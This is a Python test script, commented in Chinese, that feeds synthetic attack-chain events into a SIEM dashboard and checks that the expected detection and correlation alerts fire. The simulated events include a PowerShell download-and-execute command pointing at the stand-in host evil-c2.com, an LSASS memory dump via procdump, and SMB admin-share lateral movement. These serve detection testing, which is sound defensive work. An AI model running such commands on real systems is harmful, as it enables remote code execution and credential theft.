#!/usr/bin/env python3
"""
完整攻擊鏈模擬與 SIEM 關聯分析檢測驗證
"""

import os
import sys
from datetime import datetime
import json
import time

try:
    script_path = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_path)
    sys.path.append(os.getcwd())
except Exception as e:
    print(f"更改工作目錄時出錯: {e}")

try:
    from siem_dashboards import SOCDashboard
except ImportError as e:
    print(f"導入失敗: {e}")
    print("請確保 siem_dashboards.py 與此腳本位於同一目錄中。")
    sys.exit(1)

def get_attack_chain_events():
    """
    生成一個來自同一攻擊者的、多階段的攻擊鏈事件序列
    """
    attacker_ip = "10.10.10.100"
    compromised_host = "HR-LAPTOP-12"
    
    events = [
        # 1. 初始入侵 (T1566.001)
        {
            'event_type': 'process_creation', 'hostname': compromised_host,
            'parent_process_name': 'winword.exe', 'process_name': 'powershell.exe',
            'command_line': 'powershell.exe -NoP "IEX (New-Object Net.WebClient).DownloadString(\'http://evil-c2.com/payload.ps1\')"',
            'src_ip': attacker_ip, 'log_source': 'EDR'
        },
        # 2. 偵察 (T1059.003)
        {
            'event_type': 'process_creation', 'hostname': compromised_host,
            'process_name': 'cmd.exe', 'command_line': 'whoami',
            'src_ip': attacker_ip, 'log_source': 'EDR'
        },
        # 3. 竊取憑證 (T1003.001)
        {
            'event_type': 'process_access', 'hostname': compromised_host,
            'source_process_name': 'procdump.exe', 'target_process_name': 'lsass.exe',
            'src_ip': attacker_ip, 'log_source': 'EDR'
        },
        # 4. 橫向移動 (T1021.002)
        {
            'event_type': 'smb_connection', 'source_hostname': compromised_host,
            'dest_hostname': 'FILE-SRV-01', 'share_name': r'\\FILE-SRV-01\C$',
            'src_ip': attacker_ip, 'log_source': 'FileServerLogs'
        }
    ]
    
    # 為每個事件添加時間戳
    for event in events:
        event['timestamp'] = datetime.now().isoformat()

    return events

def run_simulation_and_verify():
    """
    執行攻擊鏈模擬並驗證 SIEM 是否能偵測到獨立攻擊與關聯攻擊
    """
    print("正在模擬完整攻擊鏈...")
    
    dashboard = SOCDashboard()
    attack_events = get_attack_chain_events()

    for event in attack_events:
        print(f"\n[+] 正在提交事件: {event.get('event_type')} / {event.get('share_name') or event.get('process_name')}")
        print(json.dumps(event, indent=2, ensure_ascii=False))
        dashboard.process_event(event)
        time.sleep(1) # 模擬事件之間的短暫間隔

    print("\n" + "="*50)
    print("所有攻擊事件已提交，開始驗證警報...")
    
    alerts = dashboard.get_dashboard_data().get('recent_alerts', [])
    print(f"SIEM 總共產生了 {len(alerts)} 條警報。")
    
    # 驗證獨立警報
    expected_rule_ids = {'R008', 'R005', 'R006', 'R011'}
    triggered_rule_ids = {alert.get('rule_id') for alert in alerts}
    
    print(f"預期觸發的獨立警報規則: {sorted(list(expected_rule_ids))}")
    print(f"實際觸發的警報規則: {sorted(list(triggered_rule_ids))}")

    missing_rules = expected_rule_ids - triggered_rule_ids
    if not missing_rules:
        print("[\u001b[32m成功\u001b[0m] 所有獨立的攻擊行為均被成功偵測！")
    else:
        print(f"[\u001b[31m失敗\u001b[0m] 遺漏了以下規則的警報: {missing_rules}")

    # 驗證關聯警報
    correlation_alert_found = any(alert.get('rule_id') == 'C001' for alert in alerts)
    
    if correlation_alert_found:
        print("[\u001b[32m成功\u001b[0m] 成功偵測到多階段攻擊鏈，並觸發了 C001 整合警報！")
    else:
        print("[\u001b[31m失敗\u001b[0m] 未能將獨立警報關聯成一個完整的攻擊鏈 (未觸發 C001)。")
        
    return not missing_rules and correlation_alert_found

def main():
    """
    主執行函數
    """
    print("="*50)
    print("== 完整攻擊鏈模擬與關聯分析驗證腳本 ==")
    print("="*50)
    
    success = run_simulation_and_verify()
    
    print("\n" + "="*50)
    if success:
        print("最終結果：成功 - 藍隊防禦系統成功偵測到所有攻擊，並將其關聯成一個完整的攻擊鏈！")
    else:
        print("最終結果：失敗 - 藍隊防禦系統未能完整地偵測或關聯本次攻擊鏈。")
    print("="*50)

if __name__ == "__main__":
    main()
